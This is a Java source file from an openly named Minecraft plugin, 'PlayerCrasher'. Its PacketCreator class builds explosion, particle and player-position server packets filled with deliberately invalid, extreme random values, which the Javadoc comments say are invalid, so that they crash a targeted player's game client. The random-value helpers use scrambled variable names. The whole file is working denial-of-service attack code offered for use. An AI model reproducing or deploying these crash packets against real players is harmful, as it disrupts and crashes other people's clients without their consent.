/*
 * This file is part of PlayerCrasher - https://github.com/Bram1903/MinecraftPlayerCrasher
 * Copyright (C) 2024 Bram and contributors
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package com.deathmotion.playercrasher.util;

import com.github.retrooper.packetevents.protocol.particle.Particle;
import com.github.retrooper.packetevents.protocol.particle.type.ParticleTypes;
import com.github.retrooper.packetevents.util.Vector3d;
import com.github.retrooper.packetevents.util.Vector3f;
import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerExplosion;
import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerParticle;
import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPlayerPositionAndLook;

import java.util.Collections;

public final class PacketCreator {

    private final WrapperPlayServerExplosion explosionPacket;
    private final WrapperPlayServerParticle particlePacket;
    private final WrapperPlayServerPlayerPositionAndLook positionPacket;

    public PacketCreator() {
        this.explosionPacket = initExplosionPacket();
        this.particlePacket = initParticlePacket();
        this.positionPacket = initPositionPacket();
    }

    public WrapperPlayServerExplosion explosionPacket() {
        return explosionPacket;
    }

    public WrapperPlayServerParticle particlePacket() {
        return particlePacket;
    }

    public WrapperPlayServerPlayerPositionAndLook positionPacket() {
        return positionPacket;
    }

    /**
     * @return a new PlayerPositionAndLook packet with invalid values.
     */
    private WrapperPlayServerPlayerPositionAndLook initPositionPacket() {
        return new WrapperPlayServerPlayerPositionAndLook(d(), d(), d(), f(), f(), b(), i(), false);
    }

    /**
     * @return a new Explosion packet with invalid values.
     */
    private WrapperPlayServerExplosion initExplosionPacket() {
        return new WrapperPlayServerExplosion(new Vector3d(d(), d(), d()), f(), Collections.emptyList(), new Vector3f(f(), f(), f()));
    }

    /**
     * @return a new Particle packet with invalid values.
     */
    private WrapperPlayServerParticle initParticlePacket() {
        return new WrapperPlayServerParticle(new Particle<>(ParticleTypes.DRAGON_BREATH), true, new Vector3d(d(), d(), d()), new Vector3f(f(), f(), f()), f(), i());
    }

    private double d() {
        double qs = Double.MAX_VALUE, mj43 = Math.random(), p6 = .75, tp9 = .5;
        return qs * ((mj43 * (((Math.sqrt(mj43) * 564 % 1) * p6) - (Math.pow(mj43, 2) % 1) * tp9) + tp9));
    }

    private float f() {
        float y8xafa = Float.MAX_VALUE;
        double zs39asa = Math.random(), r3s1 = .75, d9fs2 = .5;
        return y8xafa * ((float) (zs39asa * (((Math.sqrt(zs39asa) * 564 % 1) * r3s1) - (Math.pow(zs39asa, 2) % 1) * d9fs2) + d9fs2));
    }

    private byte b() {
        byte q4Retv = Byte.MAX_VALUE;
        double er99 = Math.random(), lr625 = .75, wf7125 = .5;
        return (byte) (q4Retv * ((er99 * (((Math.sqrt(er99) * 564 % 1) * lr625) - (Math.pow(er99, 2) % 1) * wf7125)) + wf7125));
    }

    private int i() {
        int rq4s = Integer.MAX_VALUE;
        double b45jhh = Math.random(), cr75 = .75, ds852 = .5;
        return rq4s * (int) ((b45jhh * (((Math.sqrt(b45jhh) * 564 % 1) * cr75) - (Math.pow(b45jhh, 2) % 1) * ds852)) + ds852);
    }
}
